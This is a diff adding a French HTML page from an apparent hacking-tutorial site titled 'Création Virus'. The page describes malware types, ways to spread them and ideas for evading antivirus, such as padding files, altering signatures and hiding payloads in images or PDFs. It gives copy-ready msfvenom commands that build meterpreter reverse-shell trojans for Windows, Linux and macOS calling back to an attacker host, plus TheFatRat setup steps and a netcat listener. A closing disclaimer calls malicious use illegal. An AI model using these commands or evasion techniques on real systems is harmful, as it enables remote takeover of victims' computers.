@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="../img/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="../css/styles.css">
+    <link rel="stylesheet" href="css/creation-virus.css">
+    <title>PenTaist - Création Virus</title>
+</head>
+<body>
+    <div class="topbar">
+        <nav class="navbar-links">
+            <a href="../index.html"><strong>Accueil</strong></a>
+            <a href="../categories.html"><strong>Catégories</strong></a>
+            <a href="../credits.html"><strong>Credits</strong></a>
+        </nav>
+        <nav class="navbar-social">
+            <a class="discord" href="https://discord.gg/TDXXq3XxrW"><img src="../img/discord.png" alt="discord"></a>
+        </nav>
+    </div>
+    <div class="menu">
+        <h2>Table des matières :</h2>
+        <h3>I - Introduction ></h3>
+        <a href="#c-quoi">> Qu'es ce que la création de virus ?</a>
+        <a href="#types-de-virus">> Les différents types de virus/malwares</a>
+        <a href="#propagation-de-virus">> Techniques de propagation de virus</a>
+        <a href="#anti-av">> Techniques de bypass des Antivirus</a>
+        <h3>II - Les outils ></h3>
+        <a href="#msf">> Metasploit Framework</a>
+        <a href="#thefatrat">> TheFatRat</a>
+        <a href="#nc">> NetCat</a>
+        <a href="#virustotal">> Virus Total</a>
+        <h3>IV - Conclusion</h3>
+        <a href="#conclusion">> Conclusion</a>
+    </div>
+    <div class="parties">
+        <div class="introduction">
+            <h1>I - Introduction</h1>
+            <br>
+            <h2 id="c-quoi">Qu'es ce que la création de virus ?</h2>
+            <br>
+            <p>La création de virus consiste à créer des virus/malwares afin d'avoir un contrôle sur l'équipement visé ou de dégrader celui-ci</p>
+            <br>
+            <h2 id="types-de-virus">Les différents types de virus/malwares</h2>
+            <br>
+            <p>Il existe différents types de virus/malwares :</p>
+            <br>
+            <p>Trojan ou Cheval de troie :</p>
+            <p>Le cheval de Troie est un logiciel en apparence légitime, mais qui contient une fonctionnalité malveillante. Dans la plupart des cas, il permet de prendre le contrôle d'une machine à distance.</p>
+            <br>
+            <p>Ransomware ou Rançongiciel :</p>
+            <p>Un ransomware est un logiciel malveillant qui chiffre les données d'une machine et demande une rançon (généralement en cryptomonnaie) pour déchiffrer les données.</p>
+            <br>
+            <p>Keyloggger :</p>
+            <p>Un keylogger enregistre tout ce que vous tapez au clavier et renvoie le résultat à l'attaquant (généralement par mail)</p>
+            <br>
+            <p>Vers :</p>
+            <p>est un logiciel malveillant qui se reproduit sur plusieurs ordinateurs en utilisant un réseau informatique comme Internet. Il a la capacité de se dupliquer une fois qu'il a été exécuté. Contrairement au virus, le ver se propage sans avoir besoin de se lier à d'autres programmes.</p>
+            <br>
+            <p>RootKit :</p>
+            <p>Un rootkit ou simplement « kit », est un ensemble de techniques mises en œuvre par un ou plusieurs logiciels, dont le but est d'obtenir et de pérenniser un accès à un ordinateur le plus furtivement possible.</p>
+            <br>
+            <p>Miner ou Mineur :</p>
+            <p>Un mineur vas tout simplement miner de la cryptomonnaie pour l'attaquant sans que la victime ne s'en rende compte.</p>
+            <br>
+            <p>Spyware ou Logiciel espion :</p>
+            <p>Un spyware est un logiciel malveillant qui s'installe dans un ordinateur ou autre appareil mobile, dans le but de collecter et transférer des informations sur l'environnement dans lequel il s'est installé, très souvent sans que l'utilisateur en ait connaissance.</p>
+            <br>
+            <p>Adware ou logiciel publicitaire :</p>
+            <p>Un spyware est un logiciel qui affiche de la publicité lors de son utilisation. Un logiciel publicitaire contient habituellement deux parties : une partie utile qui incite un utilisateur à l'installer sur son ordinateur ; une partie qui gère l'affichage de la publicité.</p>
+            <br>
+            <h2 id="prpagation-de-virus">Techniques de propagation de virus</h2>
+            <br>
+            <p>Les virus/malwares peuvent être transmis de pleins de façons possibles :</p>
+            <br>
+            <p>- Par mail</p>
+            <p>- Par les réseaux sociaux</p>
+            <p>- Par une clé usb ou tout autre support de stockage</p>
+            <br>
+            <h2 id="anti-av">Techniques de bypass des Antivirus</h2>
+            <br>
+            <p>Heureusement nos chers antivirus nous protègent asser bien de ces menaces mais les hackers ne sont pas stupides et ont vite mis en place plusieurs techniques pour tromper les antivirus :</p>
+            <br>
+            <p>Allourdir le fichier :</p>
+            <p>En effet, allourdir les fichiers malveillants peut être une solution car l'antivirus mettras plus de temps à scanner ce fichier ou ne le scanneras tout simplement pas de par sa taille.</p>
+            <br>
+            <p>Changer la signature du virus :</p>
+            <p>Les antivirus détéctent les malwares avec leur signature (c'est la première analyse que font les antivirus) donc si on change cette signature, plus de détéction par signature.</p>
+            <br>
+            <p>"Habiller" le virus :</p>
+            <p>Les hackers ont parfois des techniques asser bizarre mais pour le coup celle-ci fonctionne asser bien, il suffit simplement de cacher le virus dans une images ou un pdf pour que l'antivirus croie que c'est un simple fichier pdf ou une simple images.</p>
+            <br>
+            <p>Les encoders :</p>
+            <p>Il existe des encoders qui permettent en quelques sorte de bloquer l'accès à la signature pour les antivirus, cette methode fonctionne de moins en moins car les antivirus considèrent que tout les fichiers qui sont encodés même si ils ne sont pas des virus, sont quand même bloqués.</p>
+        </div>
+        <div class="outils">
+            <h1>Outils</h1>
+            <br>
+            <div class="msf_txtandimg">
+                <h2 id="msf">Metasploit Framework</h2>
+                <img src="img/msfvenom.png" alt="msfvenom">
+            </div>
+            <br>
+            <p>J'ai déjà parlé de cet outil dans <a href="https://pentaist.netlify.app/articles/outils.html#msf">cette page</a> mais là nous allons nous intérresser à la partie msfvenom de cet outil.</p>
+            <p>msfvenom est une commande qui permet de générer des "shellcodes" et des "payloads". En gros, il sert à générer des virus pour windows, linux, mac et même pour android (même si techniquement, android c'est linux).</p>
+            <hr>
+            <h4>Commandes :</h4>
+            <p>Créer un cheval de troie :</p>
+            <p>WINDOWS :</p>
+            <p>Réseau local (TCP) : msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > virus.exe</p>
+            <p>Internet (HTTP) : msfvenom -p windows/meterpreter/reverse_http LHOST=10.10.10.10 LPORT=4444 -f exe > virus.exe</p>
+            <p>Internet (HTTPS) : msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=4444 -f exe > virus.exe</p>
+            <p>LINUX :</p>
+            <p>Réseau local (TCP) : msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf > virus.elf</p>
+            <p>Internet (HTTP) : msfvenom -p linux/x86/meterpreter/reverse_http LHOST=10.10.10.10 LPORT=4444 -f elf > virus.elf</p>
+            <p>Internet (HTTPS) : msfvenom -p linux/x86/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=4444 -f elf > virus.elf</p>
+            <p>MAC :</p>
+            <p>Réseau local (TCP) : msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f macho > virus.macho</p>
+            <p>Internet (HTTP) : msfvenom -p osx/x86/shell_reverse_http LHOST=10.10.10.10 LPORT=4444 -f macho > virus.macho</p>
+            <p>Internet (HTTPS) : msfvenom -p osx/x86/shell_reverse_https LHOST=10.10.10.10 LPORT=4444 -f macho > virus.macho</p>
+            <hr>
+            <br>
+            <div class="thefatrat_txtandimg">
+                <h2 id="thefatrat">TheFatRat</h2>
+                <img src="img/thefatrat.png" alt="thefatrat">
+            </div>
+            <br>
+            <p>TheFatRat est un outil d'exploitation qui compile un malware avec une charge utile célèbre, puis le maware compilé peut être exécuté sur Linux, Windows, Mac et Android. TheFatRat fournit un moyen simple de créer des portes dérobées et une charge utile qui peuvent contourner la plupart des antivirus.</p>
+            <hr>
+            <h4>Installation :</h4>
+            <p>git clone https://github.com/screetsec/TheFatRat.git</p>
+            <p>cd TheFatRat</p>
+            <p>chmod +x setup.sh && ./setup.sh</p>
+            <h4>Mise à jour :</h4>
+            <p>cd TheFatRat</p>
+            <p>./update && chmod +x setup.sh && ./setup.sh</p>
+            <hr>
+            <h4>Commande :</h4>
+            <p>sudo fatrat</p>
+            <hr>
+            <a href="https://github.com/screetsec/TheFatRat">TheFatRat GitHub</a>
+            <br>
+            <div class="nc_txtandimg">
+                <h2 id="nc">NetCat</h2>
+                <img src="img/nc.jpg" alt="netcat">
+            </div>
+            <br>
+            <p>Un utilitaire Unix simple qui lit et écrit des données sur des connexions réseau à l'aide du protocole TCP ou UDP. Il est conçu pour être un outil "back-end" fiable qui peut être utilisé directement ou facilement piloté par d'autres programmes et scripts. En même temps, il s'agit d'un outil de débogage et d'exploration de réseau riche en fonctionnalités, car il peut créer presque tous les types de connexion dont vous auriez besoin et possède plusieurs fonctionnalités intégrées intéressantes.</p>
+            <hr>
+            <h4>Commande :</h4>
+            <p>Ecouter sur le port 4444 :</p>
+            <p>nc -nlvp 4444</p>
+            <hr>
+            <br>
+            <div class="virustotal_txtandimg">
+                <h2 id="virustotal">Virus Total</h2>
+                <img src="img/virustotal.jpg" alt="virustotal">
+            </div>
+            <br>
+            <p>VirusTotal est un service en ligne appartenant à Google qui permet l'analyse de fichiers suspects et facilite la détection rapide des virus, vers, chevaux de Troie et toutes sortes de logiciels malveillants détectés par les moteurs antivirus.</p>
+            <a href="https://virustotal.com/">VirusTotal</a>
+            <br>
+        </div>
+        <div class="conclusion">
+            <h1>Conclusion</h1>
+            <br>
+            <h2 id="conclusion">Conclusion</h2>
+            <br>
+            <p>- Il existe différent types de virus/malwares en fonction du besoin de chacuns (trojan, ransomware etc...)</p>
+            <p>- Plusieurs outils existent afin de créer ces virus/malwares</p>
+            <p>- Ils peuvent se propager via internet (mail, réseaux sociaux etc...) mais aussi par support de stockage physique (clé usb, disque dur etc...)</p>
+            <p>- Des techniques on été mises en places pour bypass les antivirus (allourdir le fichier, cacher le virus dans une images ou un pdf etc...)</p>
+        </div>
+        <h4 class="warning">ATTENTION : Créer des virus/malwares à des fins malveillant est strictement illégal et je ne serais tenus en aucuns cas responssable de vos actes</h4>
+    </div>
+</body>
+</html>
